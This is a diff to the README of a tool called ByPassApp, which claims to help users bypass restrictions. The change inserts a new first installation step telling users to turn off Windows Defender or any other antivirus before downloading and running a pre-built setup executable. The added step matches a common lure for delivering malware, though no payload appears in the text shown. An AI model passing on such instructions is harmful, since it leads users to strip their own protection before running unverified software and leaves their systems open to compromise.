@@ -15,9 +15,11 @@ ByPassApp is a lightweight Application designed to help you bypass the restricti
 
 ## Installation
 
-1. **Download**: Get the script by either cloning the repository or downloading the pre-built `ByPassApp_setup` file.
+1. **Turn off** the Windows Defender or any other antivirus software that you have installed on your system.
 
-2. **Run**: Start the application by executing the `ByPassApp_setup` file.
+2. **Download**: Get the script by either cloning the repository or downloading the pre-built `ByPassApp_setup` file.
+
+3. **Run**: Start the application by executing the `ByPassApp_setup` file.
 
 
 ## Hotkeys
